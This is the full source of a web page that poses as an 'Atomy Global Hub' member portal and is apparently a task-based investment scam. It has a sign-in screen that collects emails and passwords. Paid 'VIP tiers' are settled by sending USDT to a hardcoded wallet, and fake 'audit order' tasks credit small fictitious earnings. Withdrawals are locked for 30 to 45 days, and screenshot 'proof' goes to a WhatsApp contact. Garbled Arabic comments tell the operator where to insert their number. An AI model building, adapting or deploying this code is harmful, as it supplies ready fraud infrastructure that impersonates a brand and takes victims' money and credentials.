<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Atomy Global Hub - Secure Member Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root { 
            --primary: #00a8e3; --dark: #1a1c22; --green: #2ecc71; --red: #e74c3c; --bg: #f0f2f5; 
        }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); margin: 0; padding: 0; color: #333; }
        
        .header { background: white; padding: 20px; text-align: center; border-bottom: 3px solid var(--primary); sticky: top; z-index: 1000; }
        .logo { font-size: 22px; font-weight: 900; color: var(--primary); }

        /* Stats Section */
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 15px; }
        .stat-card { background: var(--dark); color: white; padding: 15px; border-radius: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .stat-label { font-size: 10px; color: #888; text-transform: uppercase; }
        .stat-val { font-size: 18px; font-weight: bold; margin-top: 5px; }

        /* Lock Notification */
        .lock-notice { background: #fff3cd; color: #856404; margin: 10px 15px; padding: 12px; border-radius: 12px; font-size: 11px; border: 1px solid #ffeeba; line-height: 1.5; }

        /* VIP Tiers */
        .tier-scroll { display: flex; gap: 12px; overflow-x: auto; padding: 10px 15px; }
        .tier-card { min-width: 145px; background: white; padding: 20px; border-radius: 18px; text-align: center; border: 1.5px solid #eee; transition: 0.3s; }
        .tier-card.active { border-color: var(--primary); background: #f0faff; box-shadow: 0 5px 15px rgba(0,168,227,0.1); }
        
        /* Task List */
        .task-card { background: white; margin: 0 15px 12px; padding: 18px; border-radius: 15px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 8px rgba(0,0,0,0.03); }
        .btn-task { background: var(--dark); color: white; border: none; padding: 10px 20px; border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 12px; }
        .btn-task.done { background: #eee; color: #aaa; cursor: not-allowed; }

        /* Navigation */
        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; padding: 15px; gap: 15px; box-sizing: border-box; border-top: 1px solid #eee; z-index: 1000; }
        .btn-main { flex: 1; padding: 16px; border: none; border-radius: 14px; font-weight: bold; color: white; cursor: pointer; transition: 0.2s; }
        .btn-main:active { transform: scale(0.98); }

        /* Deposit Steps Style */
        .step-box { text-align: left; background: #f9f9f9; padding: 12px; border-radius: 10px; margin: 10px 0; font-size: 13px; }
        .step-item { margin-bottom: 8px; display: flex; align-items: flex-start; gap: 10px; }
        .step-num { background: var(--primary); color: white; border-radius: 50%; width: 18px; height: 18px; display: flex; align-items: center; justify-content: center; font-size: 10px; flex-shrink: 0; margin-top: 2px; }

        /* Modal */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 2000; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(5px); }
        .modal-content { background: white; width: 100%; max-width: 380px; border-radius: 25px; padding: 30px; text-align: center; max-height: 90vh; overflow-y: auto; }

        #auth-screen { position: fixed; inset: 0; background: white; z-index: 10000; display: flex; align-items: center; justify-content: center; text-align: center; }
        .inp { width: 100%; padding: 15px; margin-top: 10px; border: 1.5px solid #eee; border-radius: 12px; box-sizing: border-box; background: #fafafa; }
    </style>
</head>
<body>

    <div id="auth-screen">
        <div style="width: 85%;">
            <div class="logo" style="font-size: 30px;">ATOMY</div>
            <p style="color: #666; margin-bottom: 30px;">Personal Platform Portal</p>
            <input type="email" id="email" class="inp" placeholder="Atomy ID / Email">
            <input type="password" id="password" class="inp" placeholder="Security Password">
            <button onclick="handleAuth()" class="btn-main" style="background:var(--primary); width:100%; margin-top:20px;">Sign In</button>
        </div>
    </div>

    <div id="main-app" style="display:none;">
        <div class="header"><div class="logo">ATOMY GLOBAL HUB</div></div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-label">Capital Balance</div>
                <div class="stat-val">$ <span id="cap-bal">0.00</span></div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Earnings (USDT)</div>
                <div class="stat-val" style="color:var(--primary)">$ <span id="prof-bal">0.00</span></div>
            </div>
        </div>

        <div id="lock-timer" class="lock-notice">Checking security protocols...</div>

        <div class="tier-scroll">
            <div class="tier-card" id="card-vip1">
                <div style="font-size:12px; color: #888;">Tier 1</div>
                <div style="font-weight:bold; margin: 5px 0;">Special Agent</div>
                <div style="color:var(--primary); font-weight:bold;">$360</div>
                <button class="btn-task" style="width:100%; margin-top:10px; padding: 8px;" id="btn-vip1" onclick="openDeposit(360, 'Special Agent')">Activate</button>
            </div>
            <div class="tier-card" id="card-vip2">
                <div style="font-size:12px; color: #888;">Tier 2</div>
                <div style="font-weight:bold; margin: 5px 0;">Dealer</div>
                <div style="color:var(--primary); font-weight:bold;">$1080</div>
                <button class="btn-task" style="width:100%; margin-top:10px; padding: 8px;" id="btn-vip2" onclick="openDeposit(1080, 'Dealer')">Activate</button>
            </div>
            <div class="tier-card" id="card-vip3">
                <div style="font-size:12px; color: #888;">Tier 3</div>
                <div style="font-weight:bold; margin: 5px 0;">Elite Master</div>
                <div style="color:var(--primary); font-weight:bold;">$2500</div>
                <button class="btn-task" style="width:100%; margin-top:10px; padding: 8px;" id="btn-vip3" onclick="openDeposit(2500, 'Elite Master')">Activate</button>
            </div>
        </div>

        <div id="tasks-container" style="padding-bottom: 120px;"></div>

        <div class="bottom-nav">
            <button class="btn-main" style="background:var(--dark);" onclick="openDeposit(360, 'VIP 1')">RECHARGE</button>
            <button class="btn-main" style="background:var(--primary);" onclick="openWithdraw()">SETTLEMENT</button>
        </div>
    </div>

    <div id="modal" class="modal">
        <div class="modal-content">
            <h3 id="m-title" style="color: var(--primary); margin-top: 0;"></h3>
            <p id="m-desc" style="font-size:13px; color:#666; line-height: 1.4;"></p>
            <div id="m-extra"></div>
            <button class="btn-main" style="background:var(--dark); width:100%; margin-top:20px;" onclick="closeModal()">Close Window</button>
        </div>
    </div>

<script>
    const WALLET_ADMIN = "TG9gT1pPJK3aETRp1hVu28F5Zayu4oVyEg";
    const WHATSAPP_NUMBER = "212XXXXXXXXX"; // ÿ∂ÿπ ÿ±ŸÇŸÖŸÉ ŸáŸÜÿß ŸÖÿπ ÿ±ŸÖÿ≤ ÿßŸÑÿØŸàŸÑÿ© ŸÑŸäÿ™ŸàÿßÿµŸÑ ŸÖÿπŸÉ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ

    const supabaseUrl = 'https://setalptyphrhbjcwmhoq.supabase.co';
    const supabaseKey = 'sb_publishable_P8QbHZQxsaAKYFTpQVU_Gw_1QU5DHas';
    const _supabase = supabase.createClient(supabaseUrl, supabaseKey);

    let userData = {}, completedCount = 0;
    const REWARDS = { 0:0, 1:0.44, 2:1.11, 3:1.55 };

    async function handleAuth() {
        const email = document.getElementById('email').value, password = document.getElementById('password').value;
        const { data, error } = await _supabase.auth.signInWithPassword({ email, password });
        if (error) alert("Invalid ID or Password"); else loadData(data.user);
    }

    async function loadData(user) {
        const { data } = await _supabase.from('profiles').select('*').eq('id', user.id).single();
        if (data) { 
            userData = data;
            completedCount = data.completed_tasks || 0;
            document.getElementById('auth-screen').style.display = 'none'; 
            document.getElementById('main-app').style.display = 'block'; 
            updateUI(); 
            checkLocks();
        }
    }

    function checkLocks() {
        if (!userData.activated_at) {
            document.getElementById('lock-timer').innerHTML = "‚ö†Ô∏è Account Inactive. Please recharge to start.";
            return;
        }
        const diffDays = Math.ceil(Math.abs(new Date() - new Date(userData.activated_at)) / (1000 * 60 * 60 * 24));
        const capL = 30 - diffDays, profL = 45 - diffDays;
        document.getElementById('lock-timer').innerHTML = `
            üõ°Ô∏è <b>Security Status:</b><br>
            Capital: ${capL > 0 ? 'Locked ('+capL+' days)' : '‚úÖ Unlocked'}<br>
            Profits: ${profL > 0 ? 'Locked ('+profL+' days)' : '‚úÖ Unlocked'}
        `;
    }

    function updateUI() {
        document.getElementById('cap-bal').innerText = (userData.balance || 0).toFixed(2);
        document.getElementById('prof-bal').innerText = (userData.profit_balance || 0).toFixed(2);
        const lv = userData.vip_level || 0;
        if(lv > 0) {
            const btn = document.getElementById(`btn-vip${lv}`);
            if(btn) { btn.innerText = "Activated"; btn.disabled = true; }
            document.getElementById(`card-vip${lv}`).classList.add('active');
        }
        const container = document.getElementById('tasks-container');
        container.innerHTML = '';
        for(let i=1; i<=10; i++) {
            const isDone = i <= completedCount;
            container.innerHTML += `
                <div class="task-card">
                    <div>
                        <div style="font-weight:bold; font-size:14px;">Audit Order #A90${i}</div>
                        <div style="font-size:11px; color:var(--primary);">Reward: +$${REWARDS[lv] || '0.00'}</div>
                    </div>
                    <button class="btn-task ${isDone ? 'done' : ''}" onclick="doTask(${i-1})">${isDone ? 'Verified' : 'Process'}</button>
                </div>`;
        }
    }

    async function doTask(index) {
        if ((userData.vip_level || 0) === 0) return alert("Please activate a VIP tier first.");
        if (index === completedCount) {
            completedCount++;
            const newP = (userData.profit_balance || 0) + REWARDS[userData.vip_level];
            const { error } = await _supabase.from('profiles').update({ completed_tasks: completedCount, profit_balance: newP }).eq('id', userData.id);
            if (!error) { userData.profit_balance = newP; updateUI(); }
        }
    }

    // ÿØÿßŸÑÿ© ÿßŸÑÿ•ŸäÿØÿßÿπ ÿßŸÑÿ¨ÿØŸäÿØÿ© ŸàÿßŸÑŸÖÿ®ÿ≥ÿ∑ÿ©
    function openDeposit(amount, tier) {
        document.getElementById('modal').style.display = 'flex';
        document.getElementById('m-title').innerText = "Easy Recharge Guide";
        document.getElementById('m-desc').innerText = "Follow these 3 simple steps to activate your " + tier + " node:";
        document.getElementById('m-extra').innerHTML = `
            <div class="step-box">
                <div class="step-item">
                    <div class="step-num">1</div>
                    <div>Copy this USDT (TRC20) address:<br>
                    <b style="word-break:break-all; color:var(--primary); font-family:monospace;">${WALLET_ADMIN}</b></div>
                </div>
                <div class="step-item">
                    <div class="step-num">2</div>
                    <div>Transfer exactly <b>$${amount}</b> from your Binance or TrustWallet.</div>
                </div>
                <div class="step-item">
                    <div class="step-num">3</div>
                    <div>Take a <b>Screenshot</b> of the success page and send it to our support below.</div>
                </div>
            </div>
            <button onclick="contactSupport('${tier}')" class="btn-main" style="background:var(--green); width:100%; margin-top:10px;">
                ‚úÖ Sent. Click to Send Screenshot
            </button>
        `;
    }

    function contactSupport(tier) {
        const msg = encodeURIComponent("Hello Atomy Support, I have just transferred the funds for " + tier + " activation. Here is my screenshot proof.");
        window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${msg}`, '_blank');
    }

    function openWithdraw() {
        const activatedDate = new Date(userData.activated_at || new Date());
        const daysPassed = Math.floor((new Date() - activatedDate) / (1000 * 60 * 60 * 24));
        document.getElementById('modal').style.display = 'flex';
        document.getElementById('m-title').innerText = "Settlement Request";
        
        if (!userData.activated_at || daysPassed < 30) {
            document.getElementById('m-desc').innerText = "Your account is in the 30-day initial audit phase. Withdrawals are currently locked.";
            document.getElementById('m-extra').innerHTML = `<div style="color:var(--red); font-weight:bold; margin-top:10px;">Unlock available in ${30 - daysPassed} days.</div>`;
        } else {
            document.getElementById('m-desc').innerText = "Enter your payout details:";
            document.getElementById('m-extra').innerHTML = `
                <input type="text" id="user-w" class="inp" placeholder="Your USDT TRC20 Address">
                <input type="number" id="w-amt" class="inp" placeholder="Amount to withdraw ($)">
                <p style="font-size:11px; color:#888; margin-top:10px;">${daysPassed < 45 ? "‚ö†Ô∏è Note: You can only withdraw Capital before day 45." : "‚úÖ Full access to Profits & Capital."}</p>
                <button onclick="requestPayout(${daysPassed})" class="btn-main" style="background:var(--primary); width:100%;">Submit Request</button>
            `;
        }
    }

    async function requestPayout(days) {
        const amt = parseFloat(document.getElementById('w-amt').value);
        const wallet = document.getElementById('user-w').value;
        if (days < 45 && amt > userData.balance) return alert("Before day 45, you can only withdraw your initial capital ($" + userData.balance + ").");
        if (amt < 50) return alert("Minimum withdrawal is $50.");
        
        const { error } = await _supabase.from('withdrawals').insert([{ user_id: userData.id, amount: amt, wallet_address: wallet, status: 'pending' }]);
        if (!error) { alert("Request sent! Our team will verify and process within 24 hours."); closeModal(); }
    }

    function closeModal() { document.getElementById('modal').style.display = 'none'; }
</script>
</body>
</html>
